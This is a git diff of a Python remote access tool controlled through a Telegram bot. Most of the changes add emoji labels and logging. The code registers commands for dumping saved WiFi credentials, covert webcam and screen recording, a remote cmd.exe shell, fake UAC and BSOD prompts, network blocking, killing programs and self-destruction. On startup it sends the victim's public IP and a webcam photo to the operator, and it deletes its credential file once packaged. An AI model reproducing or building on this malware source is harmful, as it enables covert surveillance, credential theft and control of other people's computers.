@@ -67,8 +67,9 @@ from keyboard import press as press_key, release as release_key, read_event, KEY
 from os.path import join, abspath, isdir, isfile, exists, dirname, realpath, split as pathsplit, basename, getsize
 
 
+FROZEN = getattr(sys, 'frozen', False)
 def resource_path(relative_path: str) -> str:
-    if getattr(sys, 'frozen', False):
+    if FROZEN:
         base_path = dirname(sys.executable)
     else:
         base_path = dirname(__file__)
@@ -158,7 +159,7 @@ if isdir(DLLS_DIR):
         if isfile(file) and file.endswith(".dll"):
             load_dll(join(DLLS_DIR, file))
 else:
-    print(f"Error: DLLS directory not does not exist or it was empty: {DLLS_DIR}")
+    print(f"DLLS directory not does not exist or it was empty: {DLLS_DIR}")
 #UTILS
 from utils import *
 try:
@@ -180,7 +181,6 @@ def _patched_popen(*args, **kwargs):
     return Popen(*args, **kwargs)
 
 def get_decrypted_content(fernet: Fernet, src_path) -> str:
-    print(f"Decrypting: {src_path}\nkey:{FERNET_KEY}")#TODO remove after debug
     with open(src_path, "rb") as f:
         encrypted = f.read()
     decrypted = fernet.decrypt(encrypted)
@@ -259,7 +259,8 @@ def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
     else:
         with open(filename) as fi:
             var = json.load(fi)
-    remove(filename)
+    if FROZEN:
+        remove(filename)
     return var["token"],var["chatid"],var["ngrok_token"],var["tunnel_provider"]
         
 #Resizing assets so they all take the same time to load when doing jumpscares(I guess)
@@ -481,7 +482,7 @@ class PeppinoTelegram:
         self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%'")
         self.cmd_session_active: bool = False
 
-        LOADING_STATUS_MESSAGE = self.new_editable_message("Loading functions")
+        LOADING_STATUS_MESSAGE = self.new_editable_message("🛠️ Loading functions")
 
         #gets the function from the text
         self.commands = [
@@ -510,7 +511,7 @@ class PeppinoTelegram:
             # 🛑 System & Shutdown
             Command("shutdown", self.shutdown, "Power off PC.", "system", "🛑 Shutdown"),
             Command("fakeshutdown", self.fake_shutdown, "Fake shutdown sequence.", "system", "🎭 Fakeshutdown"),
-            Command("fakeuac", self.fakeuac, "Fake UAC prompt.", "system", "Fake UAC"),
+            Command("fakeuac", self.fakeuac, "Show fake UAC prompt.", "system", "🛡️ Fake UAC"),
             Command("selfdestruction", self.selfdestruction, "Remove program permanently.", "system", "💣 Selfdestruction"),
             Command("clear", self.clear, "Clean windows, webcam, temp files.", "system", "🧹 Clear"),
             Command("altf4", self.altf4, "Send Alt+F4.", "system", "⌨️ Altf4"),
@@ -518,7 +519,6 @@ class PeppinoTelegram:
             # 🌐 Network & Remote Access
             Command("wifiinfo", self.wifiinfo, "Show saved WiFi credentials.", "network", "📶 Wifiinfo"),
             Command("getip", self.getip, "Get public IP and location.", "network", "🌐 Get IP"),
-            Command("urltoast", notify_toast, "Show Windows toast with URL.", "network", "🔗 URL Toast"),
 
             # 📸 Camera & Screen
             Command("selfie", self.selfie, "Take webcam photo.", "camera", "🤳 Webcam Snapshot"),
@@ -565,13 +565,13 @@ class PeppinoTelegram:
             Command("behindyou_whisper", self.behindyou_whisper, "Play 'Behind you' whisper.", "sound_fx", "👻 Behind you (whisper)"),
 
             # 😈 Pranks & Visuals
-            #all the TODO here are basically to add LoadingBarTimedWorker in the Commands who have TODO near to them
-            Command("hidecursor", self.wrapper_for_hide_cursor, "Hides mouse's cursor", "pranks", "Hide Cursor"),
+            #TODO here are basically to add LoadingBarTimedWorker in the Commands who have TODO near to them
+            Command("hidecursor", self.wrapper_for_hide_cursor, "Hides mouse's cursor", "pranks", "🖱️ Hide Mouse Cursor"),
             Command("jumpscare", self.jumpscare, "Trigger random jumpscare.", "pranks", "👻 Jumpscare"),
             Command("jumpscarenoaudio", self.jumpscarenoaudio, "Jumpscare without sound.", "pranks", "😶‍🌫️ Jumpscare noaudio"),
             Command("fakebsod", self.fake_bsod, "Show fake Blue Screen of Death.", "pranks", "💀 Fake BSOD"),
             Command("invertedscreen", self.inverted_screen, "Invert screen colors.", "pranks", "🔄 Inverted Screen"),
-            Command("showqr",self.show_qr_overlay,"Display QR code overlay with custom text. Args: url [text] [duration]","pranks","QR Overlay"),
+            Command("showqr",self.show_qr_overlay,"Display QR code overlay with custom text. Args: url [text] [duration]","pranks","🟨 QR Overlay"),
             Command("distortedscreen", self.distorted_screen, "Distort screen output.", "pranks", "🌀 Distorted Screen"),
             Command("messagebox", self.message_box, "Show custom message box.", "pranks", "💬 Message Box"),
             Command("messagespam", self.spam_windows, "Spam message boxes.", "pranks", "📨 Message Spam"),
@@ -580,8 +580,8 @@ class PeppinoTelegram:
             Command("hdmi_drowning_effect", self.wrapper_for_disturbed_overlay, "Noise overlay effect.", "pranks", "🖥️🌀 Video Signal Drowning Effect"),
             Command("disturbed_overlay_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "pranks", "🌀📻 Video&Sound Disturbance"),#TODO
             Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "pranks", "👻 Red Text Overlay"),
-            Command("set_jumpscare_volume", self.setJumpscareVolume, "Set jumpscare's volume.","pranks" , "Set Jumpscare Volume"),
-            Command("block_screen", self.wrapper_block_screen, "Block screen", "pranks", "Block Screen"), #TODO
+            Command("set_jumpscare_volume", self.setJumpscareVolume, "Adjust jumpscare volume.","pranks" , "🔊 Jumpscare Volume"),
+            Command("block_screen", self.wrapper_block_screen, "Block user screen temporarily forcing them to see a screenshot.", "pranks", "🖥️ Block Screen"), #TODO
 
             # 🦑 Misc & Memes
             Command("plankton", self.plankton, "Plankton jumpscare.", "misc", "🦑 Plankton"),
@@ -622,7 +622,8 @@ class PeppinoTelegram:
             # 👤 User Interaction
             Command("ask", self.user_prompt, "Ask Something to the user using the machine", "user_interaction", "🗣️ Ask"),
             Command("messagebox", self.message_box, "Show custom message box.", "user_interaction", "💬 Message Box"),
-            Command("chat", self.chat, "Chat.", "user_interaction", "Chat"),
+            Command("chat", self.chat, "Open chat interface.", "user_interaction", "💬 Chat"),
+            Command("urltoast", notify_toast, "Show Windows toast with URL.", "user_interaction", "🔗 URL Toast"),
 
             # 🔒 Can't Open List
             Command("cantopenadd", self.cantopen, "Block process execution.", "cant_open", "🚫 Cantopenadd"),
@@ -650,7 +651,7 @@ class PeppinoTelegram:
 
         self.help = generate_help(self.commands)
         self.function_table = {x.name:x.function for x in self.commands}
-        LOADING_STATUS_MESSAGE.edit("COMMANDS LOADED, LOADING PLUGINS")
+        LOADING_STATUS_MESSAGE.edit("✅ COMMANDS LOADED, 🔌 LOADING PLUGINS")
 
         if plugins:
             sleep(.25)
@@ -659,11 +660,11 @@ class PeppinoTelegram:
                 function_table_update = {v[0]:v[1] for _,v in plugins_commands.items()}
                 self.plugins_buttons = {k:f"/{v[0]}" for k,v in plugins_commands.items()}
                 self.function_table.update(function_table_update)
-            LOADING_STATUS_MESSAGE.edit("PLUGINS LOADED")
+            LOADING_STATUS_MESSAGE.edit("🔌 PLUGINS LOADED ✅")
 
         sleep(.25)
         self.no_background_functions = [self.message_box, self.spam_windows]
-        LOADING_STATUS_MESSAGE.edit("READY")
+        LOADING_STATUS_MESSAGE.edit("🚀 READY")
         LOADING_STATUS_MESSAGE.delete()
 
     def __play_loaded_sound(self, audio: str, volume=None) -> None:
@@ -729,14 +730,14 @@ class PeppinoTelegram:
     @requires_admin
     def block_port(self, port: int, timeout: int) -> None:
         print(f"Blocking port {port} for {timeout} seconds")
-        loading_bar = self.new_loading_bar_timed_worker("Blocking Port", timeout, block_port, args=(port, timeout))
+        loading_bar = self.new_loading_bar_timed_worker(f"🚫 Blocking Port <b>{port}</b>", timeout, block_port, args=(port, timeout))
         if not loading_bar: return
         loading_bar.start()
 
     @requires_admin
     def block_http(self, timeout: int) -> None:
         print(f"Blocking HTTP for {timeout} seconds")
-        loading_bar = self.new_loading_bar_timed_worker("Blocking HTTP", timeout, block_http, args=(timeout,))
+        loading_bar = self.new_loading_bar_timed_worker("🚫 Blocking HTTP", timeout, block_http, args=(timeout,))
         if not loading_bar: return
         loading_bar.start()
 
@@ -752,7 +753,7 @@ class PeppinoTelegram:
             return
 
         print(f"Blocking HTTPS for {timeout} seconds")
-        loading_bar = self.new_loading_bar_timed_worker("Blocking HTTPS", timeout, block_https, args=(timeout,))
+        loading_bar = self.new_loading_bar_timed_worker("🚫 Blocking HTTPS", timeout, block_https, args=(timeout,))
         if not loading_bar: return
         loading_bar.start()
 
@@ -2097,7 +2098,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def playrandomnoise(self, duration: int) -> None:
         print(f"Playing random noise for {duration} seconds")
         start = monotonic()
-        loading_bar = self.new_loading_bar(duration, label="Play Random Noise")
+        loading_bar = self.new_loading_bar(duration, label="📡 Play Random Noise")
         if not loading_bar: return
         thread = Thread(target=self.audio_player.play_random_noise, args=(duration,))
         thread.start()
@@ -2180,7 +2181,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def record_screen(self, duration: int=10, caption: str|None=None) -> None:
         print(f"Recording screen for {duration} seconds")
         duration = int(duration)
-        bar = self.new_loading_bar(duration, label=f"{emoji_dict['screen']} Recording Screen")
+        bar = self.new_loading_bar(duration, label="🖥️ Recording Screen")
         if not bar: return
         try:
             filename = join(f"{BURN_DIRECTORY}", f"{randomname()}.mp4")
@@ -2231,7 +2232,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def record_webcam(self, duration: int = 10, caption: str | None = None) -> None:
         try:
             duration = int(duration)
-            bar = self.new_loading_bar(duration, label="Recording Webcam", showperc=True)
+            bar = self.new_loading_bar(duration, label="📹 Recording Webcam", showperc=True)
             if not bar: return
 
             filename = join(BURN_DIRECTORY, f"{randomname()}.mp4")
@@ -2295,7 +2296,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def record_webcam_and_screen(self, capture_duration: int=10, caption: str|None=None) -> None:
         print(f"Recording webcam and screen for {capture_duration} seconds")
         capture_duration = int(capture_duration)
-        bar = self.new_loading_bar(capture_duration, label=f"{emoji_dict['photo']}{emoji_dict['screen']} Recording Webcam&Screen")
+        bar = self.new_loading_bar(capture_duration, label="📹🖥️ Recording Webcam & Screen")
         if not bar: return
         try:
             filename = join(BURN_DIRECTORY, randomname()+".mp4")
@@ -2467,7 +2468,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         if not self.confirmContuinuingWithoutWallpaperBackup():
             return
         seconds = int(seconds)
-        loading_bar = self.new_loading_bar(label=f"{emoji_dict['camera']}{emoji_dict['screen']} Set Camera As Wallpaper", total=seconds, showperc=True)
+        loading_bar = self.new_loading_bar(label="📷 Set Camera As Wallpaper", total=seconds, showperc=True)
         if not loading_bar: return
         filename = join(BURN_DIRECTORY, "jxframe.png")
         start = monotonic()
@@ -2709,54 +2710,55 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def start(self) -> None:
         print("Starting bot")
-        STARTING_LOG_MESSAGE = self.new_editable_message("STARTING")
+        STARTING_LOG_MESSAGE = self.new_editable_message("🚀 STARTING")
         #Getting rid of old shi
         try:
             self.bot.deleteWebhook()
         except MaxRetryError:
             #don't care
             ...
-        STARTING_LOG_MESSAGE.edit("DELETED WEBHOOK")
+        STARTING_LOG_MESSAGE.edit("🗑️ DELETED WEBHOOK")
 
         self.bot.getUpdates()
-        STARTING_LOG_MESSAGE.edit("GOT UPDATES")
+        STARTING_LOG_MESSAGE.edit("🔄 GOT UPDATES")
 
         self.images = load_images()
-        STARTING_LOG_MESSAGE.edit("GOT IMAGES")
+        STARTING_LOG_MESSAGE.edit("🖼️ GOT IMAGES")
 
         self.update_commands()
-        STARTING_LOG_MESSAGE.edit("GOT COMMANDS")
+        STARTING_LOG_MESSAGE.edit("⚙️ GOT COMMANDS")
 
         nomemes = list(self.images.copy().keys())
         self.nomemes = list(filter(lambda x: x.startswith("jmp"), nomemes))
 
         self.audios = load_audios()
-        STARTING_LOG_MESSAGE.edit("AUDIOS LOADED")
+        STARTING_LOG_MESSAGE.edit("🎵 AUDIOS LOADED")
 
         curr_wallpaper_path = get_current_wallpaper()
         if curr_wallpaper_path:
             self.backup_wallpaper_path = join(BURN_DIRECTORY, curr_wallpaper_path)
+            STARTING_LOG_MESSAGE.edit("🖼️ WALLPAPER BACKED UP")
         else:
             self.backup_wallpaper_path = None
-        STARTING_LOG_MESSAGE.edit("WALLPAPER BACKED UP")
+            STARTING_LOG_MESSAGE.edit("🚫🖼️ WALLPAPER NOT BACKED UP")
 
         self.cantopenthread = Thread(target=self.cantopenkiller)
         self.cantopenthread.start()
-        STARTING_LOG_MESSAGE.edit("PROGRAM KILLER STARTED")
+        STARTING_LOG_MESSAGE.edit("💀 PROGRAM KILLER STARTED")
 
         self.processmonthread = Thread(target=self.processmonitorloop)
         self.processmonthread.start()
-        STARTING_LOG_MESSAGE.edit("PROCESS MONITOR STARTED")
+        STARTING_LOG_MESSAGE.edit("📊 PROCESS MONITOR STARTED")
 
         self.connectioncheckerthread = Thread(target=self.connectioncheckerloop)
         self.connectioncheckerthread.start()
 
         self.screen_width, self.screen_height = pg.size()
-        STARTING_LOG_MESSAGE.edit("GOT SCREEN SIZE")
+        STARTING_LOG_MESSAGE.edit("🖥️ GOT SCREEN SIZE")
 
-        STARTING_LOG_MESSAGE.edit("GETTING PUBLIC IP")
+        STARTING_LOG_MESSAGE.edit("🌐 GETTING PUBLIC IP")
         public_ip = get_public_ip()
-        STARTING_LOG_MESSAGE.edit("GETTING BASIC INFO AND WEBCAM SELPHIE")
+        STARTING_LOG_MESSAGE.edit("📋 GETTING BASIC INFO AND 📸 WEBCAM SELFIE")
 
         botstartedmessage = (
             "🚀 <b>RCPT Online – Ready</b> 🚀\n\n"
@@ -2784,7 +2786,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.bot.getUpdates(-1) #if the bot gets accidentally added to a group, which telepot can't handle, this will fix it
         loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
         loop.run_as_thread()
-        STARTING_LOG_MESSAGE.edit("STARTED MESSAGE LOOP")
+        STARTING_LOG_MESSAGE.edit("🔄 STARTED MESSAGE LOOP")
         STARTING_LOG_MESSAGE.delete() #Weeeeeeeeeeeee
         self.startupscript()
         while self.running:
@@ -2896,7 +2898,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def wrapper_for_disturbed_overlay(self, timeout_seconds: int, custom_label=None, custom_oncancel=None) -> None:
         print(f"Starting VideoDisturbance overlay for {timeout_seconds} seconds")
         if  custom_label is None:
-            custom_label = "Disturbance Overlay"
+            custom_label = "🌀 Disturbance Overlay"
         if custom_oncancel is None:
             custom_oncancel = self.overlay_opencv.setstop
         bar = self.new_loading_bar_timed_worker(label=custom_label,
@@ -2911,7 +2913,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print("Hiding cursor")
         se = Event()
         bar = self.new_loading_bar_timed_worker(
-            label="Hide Mouse Cursor",
+            label="🖱️ Hide Mouse Cursor",
             duration=timeout,
             target=lambda:...,
             on_cancel=se.set,
@@ -2929,7 +2931,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def wrapper_block_screen(self, timeout: int) -> None:
         bar = self.new_loading_bar_timed_worker(target=self.overlay_opencv.run_block_screen,
-                                          label="Blocking Screen",
+                                          label="🖥️🚫 Blocking Screen",
                                           duration=timeout,
                                           on_cancel=self.overlay_opencv.setstop,
                                           args=(timeout, )) 
@@ -2941,7 +2943,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         t2 = Thread(target=self.audio_player.play_random_noise, args=(duration,))
         t2.start()
         self.wrapper_for_disturbed_overlay(duration,
-                                      custom_label="Disturbance Overlay and noise",
+                                      custom_label="🌀📡 Disturbance Overlay and noise",
                                       custom_oncancel=self.audio_player.stopallsounds)#, self.overlay_opencv.setstop()))
                                       #TODO Noise still does not stop
         t2.join()
@@ -2957,9 +2959,11 @@ o8o        o888o `Y888""8o o888o o888o o888o
 """
 
 if __name__ == "__main__":
+    print("Loading credentials")
     try:
         token, chat_id, ngrok_token, tunnel_provider = getCred() 
     except Exception as e:
+        print(f"Error while loading credentials: {e}\n")
         sys.exit()
         """
         # If there is an error with the credentials this is the only way of knowing it
